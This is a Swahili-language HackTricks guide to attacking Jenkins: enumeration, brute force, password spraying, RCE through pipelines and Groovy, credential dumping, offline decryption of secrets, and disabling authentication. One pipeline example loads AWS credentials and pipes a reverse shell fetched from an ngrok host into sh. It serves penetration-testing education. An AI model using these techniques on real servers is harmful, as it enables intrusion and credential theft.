# Jenkins Security

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mipango ya usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

## Taarifa za Msingi

Jenkins ni chombo kinachotoa njia rahisi ya kuanzisha mazingira ya **continuous integration** au **continuous delivery** (CI/CD) kwa karibu **mchanganyiko wowote** wa **lugha za programu** na hazina za msimbo wa chanzo kwa kutumia pipelines. Zaidi ya hayo, inafanya kazi nyingi za maendeleo za kawaida kiotomatiki. Ingawa Jenkins haiondoi **haja ya kuunda maandiko kwa hatua za kibinafsi**, inatoa njia ya haraka na thabiti zaidi ya kuunganisha mlolongo mzima wa zana za kujenga, kupima, na kupeleka kuliko mtu anavyoweza kujenga kwa urahisi mwenyewe.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Uorodheshaji Bila Uthibitisho

Ili kutafuta kurasa za Jenkins za kuvutia bila uthibitisho kama (_/people_ au _/asynchPeople_, hii inaorodhesha watumiaji wa sasa) unaweza kutumia:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Angalia kama unaweza kutekeleza amri bila kuhitaji uthibitishaji:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Bila kuwa na hati za kuingia unaweza kuangalia ndani ya njia _**/asynchPeople/**_ au _**/securityRealm/user/admin/search/index?q=**_ kwa **majina ya watumiaji**.

Unaweza kupata toleo la Jenkins kutoka kwenye njia _**/oops**_ au _**/error**_

![](<../../.gitbook/assets/image (146).png>)

### Udhaifu Uliyojulikana

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Kuingia

Katika taarifa za msingi unaweza kuangalia **njia zote za kuingia ndani ya Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Kujisajili

Utaweza kupata Jenkins instances ambazo **zinakuruhusu kuunda akaunti na kuingia ndani yake. Rahisi kama hivyo.**

### **Kuingia kwa SSO**

Pia kama **SSO** **functionality**/**plugins** zipo basi unapaswa kujaribu **kuingia** kwenye programu kwa kutumia akaunti ya majaribio (yaani, akaunti ya majaribio ya **Github/Bitbucket**). Mbinu kutoka [**hapa**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** haina **sera ya nywila** na **kinga dhidi ya brute-force ya majina ya watumiaji**. Ni muhimu **kufanya brute-force** kwa watumiaji kwani **nywila dhaifu** au **majina ya watumiaji kama nywila** yanaweza kutumika, hata **majina ya watumiaji yaliyogeuzwa kama nywila**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Tumia [hii script ya python](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) au [hii script ya powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP Whitelisting Bypass

Mashirika mengi yanachanganya **SaaS-based source control management (SCM) systems** kama GitHub au GitLab na **internal, self-hosted CI** solution kama Jenkins au TeamCity. Mpangilio huu unaruhusu CI systems **kupokea webhook events kutoka kwa SaaS source control vendors**, hasa kwa ajili ya kuanzisha pipeline jobs.

Ili kufanikisha hili, mashirika **whitelist** **IP ranges** za **SCM platforms**, zikiruhusu kufikia **internal CI system** kupitia **webhooks**. Hata hivyo, ni muhimu kutambua kwamba **mtu yeyote** anaweza kuunda **akaunti** kwenye GitHub au GitLab na kuisanidi ili **kuanzisha webhook**, ikiwezekana kutuma maombi kwa **internal CI system**.

Angalia: [shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Internal Jenkins Abuses

Katika hali hizi tutadhani una akaunti halali ya kufikia Jenkins.

{% hint style="warning" %}
Kulingana na **Authorization** mechanism iliyosanidiwa kwenye Jenkins na ruhusa ya mtumiaji aliyeathirika unaweza **kufanya au usiweze kufanya mashambulizi yafuatayo.**
{% endhint %}

Kwa maelezo zaidi angalia maelezo ya msingi:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listing users

Ikiwa umefikia Jenkins unaweza kuorodhesha watumiaji wengine waliosajiliwa katika [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping builds to find cleartext secrets

Tumia [hii script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) kudump build console outputs na build environment variables ili kutafuta cleartext secrets.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Kuiba SSH Credentials**

Ikiwa mtumiaji aliyeathiriwa ana **haki za kutosha za kuunda/kubadilisha node mpya ya Jenkins** na SSH credentials tayari zimehifadhiwa ili kufikia nodes nyingine, anaweza **kuiba credentials hizo** kwa kuunda/kubadilisha node na **kusanidi host ambayo itarekodi credentials** bila kuthibitisha host key:

![](<../../.gitbook/assets/image (218).png>)

Kwa kawaida utapata Jenkins ssh credentials katika **global provider** (`/credentials/`), kwa hivyo unaweza pia kuzidump kama unavyodump siri nyingine yoyote. Maelezo zaidi katika [**Sehemu ya kudump siri**](./#dumping-secrets).

### **RCE katika Jenkins**

Kupata **shell katika server ya Jenkins** kunampa mshambulizi fursa ya kuvuja **siri zote** na **env variables** na **kushambulia mashine nyingine** zilizoko katika mtandao huo huo au hata **kukusanya cloud credentials**.

Kwa default, Jenkins ita **run kama SYSTEM**. Kwa hivyo, kuathiri Jenkins kutampa mshambulizi **haki za SYSTEM**.

### **RCE Kuunda/Kubadilisha mradi**

Kuunda/Kubadilisha mradi ni njia ya kupata RCE juu ya server ya Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Kutekeleza script ya Groovy**

Unaweza pia kupata RCE kwa kutekeleza script ya Groovy, ambayo inaweza kuwa ya siri zaidi kuliko kuunda mradi mpya:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Kuunda/Kubadilisha Pipeline

Unaweza pia kupata **RCE kwa kuunda/kubadilisha pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Udukuzi wa Pipeline

Ili kudukua pipelines bado unahitaji kuwa na ufikiaji wa Jenkins.

### Kujenga Pipelines

**Pipelines** pia zinaweza kutumika kama **mfumo wa kujenga miradi**, katika hali hiyo inaweza kusanidiwa **faili ndani ya repository** ambayo itakuwa na syntax ya pipeline. Kwa default `/Jenkinsfile` inatumika:

![](<../../.gitbook/assets/image (127).png>)

Inawezekana pia **kuhifadhi faili za usanidi wa pipeline sehemu nyingine** (katika repositories nyingine kwa mfano) kwa lengo la **kutenganisha** ufikiaji wa repository na ufikiaji wa pipeline.

Ikiwa mshambulizi ana **haki za kuandika juu ya faili hiyo** ataweza **kuibadilisha** na **kuchochea pipeline** bila hata kuwa na ufikiaji wa Jenkins.\
Inawezekana kwamba mshambulizi atahitaji **kupita baadhi ya ulinzi wa matawi** (kulingana na jukwaa na haki za mtumiaji zinaweza kupitishwa au la).

Vichochezi vya kawaida vya kutekeleza pipeline maalum ni:

* **Pull request** kwa tawi kuu (au pengine kwa matawi mengine)
* **Push kwa tawi kuu** (au pengine kwa matawi mengine)
* **Sasisha tawi kuu** na subiri hadi itekelezwe kwa namna fulani

{% hint style="info" %}
Ikiwa wewe ni **mtumiaji wa nje** hupaswi kutarajia kuunda **PR kwa tawi kuu** la repo ya **mtumiaji/taasisi nyingine** na **kuchochea pipeline**... lakini ikiwa **imewekwa vibaya** unaweza **kuathiri kampuni kikamilifu kwa kudukua hii**.
{% endhint %}

### Pipeline RCE

Katika sehemu ya awali ya RCE tayari ilionyeshwa mbinu ya [**kupata RCE kwa kubadilisha pipeline**](./#rce-creating-modifying-pipeline).

### Kukagua Env variables

Inawezekana kutangaza **env variables za maandishi wazi** kwa pipeline nzima au kwa hatua maalum. Env variables hizi **hazipaswi kuwa na taarifa nyeti**, lakini mshambulizi anaweza **kukagua usanidi wote wa pipeline/Jenkinsfiles**:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Kutoa siri

Kwa habari kuhusu jinsi siri zinavyoshughulikiwa na Jenkins angalia taarifa za msingi:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Credentials zinaweza kuwa **scoped to global providers** (`/credentials/`) au kwa **miradi maalum** (`/job/<project-name>/configure`). Kwa hiyo, ili kutoa zote unahitaji **kuhujumu angalau miradi yote** inayobeba siri na kutekeleza pipelines maalum/iliyoharibiwa.

Kuna tatizo jingine, ili kupata **siri ndani ya env** ya pipeline unahitaji **kujua jina na aina ya siri**. Kwa mfano, ukijaribu **kupakia** **`usernamePassword`** **siri** kama **`string`** **siri** utapata **hitilafu** hii:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Hapa kuna njia ya kupakia aina za siri za kawaida:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Mwisho wa ukurasa huu unaweza **kupata aina zote za vitambulisho**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
Njia bora ya **kudump siri zote mara moja** ni kwa **kuhujumu** mashine ya **Jenkins** (kuendesha reverse shell kwenye **built-in node** kwa mfano) na kisha **kuleak** **master keys** na **siri zilizofichwa** na kuzifungua nje ya mtandao.\
Zaidi kuhusu jinsi ya kufanya hivi katika [Sehemu ya Nodes & Agents](./#nodes-and-agents) na katika [Sehemu ya Post Exploitation](./#post-exploitation).
{% endhint %}

### Triggers

Kutoka [kwa nyaraka](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): `triggers` directive inafafanua **njia za kiotomatiki ambazo Pipeline inapaswa kuanzishwa tena**. Kwa Pipelines ambazo zimeunganishwa na chanzo kama GitHub au BitBucket, `triggers` inaweza kuwa si lazima kwani ushirikiano wa msingi wa webhooks tayari utakuwepo. Triggers zinazopatikana kwa sasa ni `cron`, `pollSCM` na `upstream`.

Mfano wa Cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Angalia **mifano mingine kwenye nyaraka**.

### Nodes & Agents

**Jenkins instance** inaweza kuwa na **agents tofauti zinazoendesha kwenye mashine tofauti**. Kutoka kwa mtazamo wa mshambulizi, kupata ufikiaji wa mashine tofauti kunamaanisha **credentials tofauti za cloud** za kuiba au **ufikiaji wa mtandao tofauti** ambao unaweza kutumiwa vibaya kushambulia mashine zingine.

Kwa maelezo zaidi angalia maelezo ya msingi:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Unaweza kuorodhesha **nodes zilizosanidiwa** katika `/computer/`, kwa kawaida utapata \*\*`Built-In Node` \*\* (ambayo ni node inayoendesha Jenkins) na pengine zaidi:

![](<../../.gitbook/assets/image (249).png>)

Ni **muhimu sana kuathiri Built-In node** kwa sababu ina taarifa nyeti za Jenkins.

Kuonyesha unataka **kuendesha** **pipeline** katika **built-in Jenkins node** unaweza kubainisha ndani ya pipeline usanidi ufuatao:
```bash
pipeline {
agent {label 'built-in'}
```
### Mfano kamili

Pipeline katika wakala maalum, na kichocheo cha cron, na pipeline na hatua za env variables, kupakia variables 2 katika hatua na kutuma reverse shell:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Exploitation

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Siri za Jenkins

Unaweza kuorodhesha siri kwa kufikia `/credentials/` ikiwa una ruhusa za kutosha. Kumbuka kuwa hii itaorodhesha tu siri zilizo ndani ya faili `credentials.xml`, lakini **faili za usanidi wa ujenzi** zinaweza pia kuwa na **siri zaidi**.

Ikiwa unaweza **kuona usanidi wa kila mradi**, unaweza pia kuona huko **majina ya siri (credentials)** zinazotumika kufikia hazina na **siri nyingine za mradi**.

![](<../../.gitbook/assets/image (180).png>)

#### Kutoka Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Kutoka diski

Faili hizi zinahitajika ili **kufungua siri za Jenkins**:

* secrets/master.key
* secrets/hudson.util.Secret

**Siri kama hizi kawaida hupatikana katika**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Hapa kuna regex ya kuzipata:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Fichua siri za Jenkins nje ya mtandao

Ikiwa umepakua **nywila zinazohitajika kufichua siri**, tumia [**script hii**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **kufichua siri hizo**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Kufungua siri za Jenkins kutoka Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Unda mtumiaji mpya wa admin

1. Fikia faili la Jenkins config.xml katika `/var/lib/jenkins/config.xml` au `C:\Program Files (x86)\Jenkis\`
2. Tafuta neno `<useSecurity>true</useSecurity>` na ubadilishe neno \*\*`true` \*\* kuwa **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Anzisha upya** seva ya **Jenkins**: `service jenkins restart`
4. Sasa nenda kwenye portal ya Jenkins tena na **Jenkins haitahitaji nywila yoyote** wakati huu. Nenda kwenye "**Manage Jenkins**" kuweka **nywila ya msimamizi tena**.
5. **Wezesha** **usalama** tena kwa kubadilisha mipangilio kuwa `<useSecurity>true</useSecurity>` na **anzisha upya Jenkins tena**.

## Marejeleo

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mipango ya usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
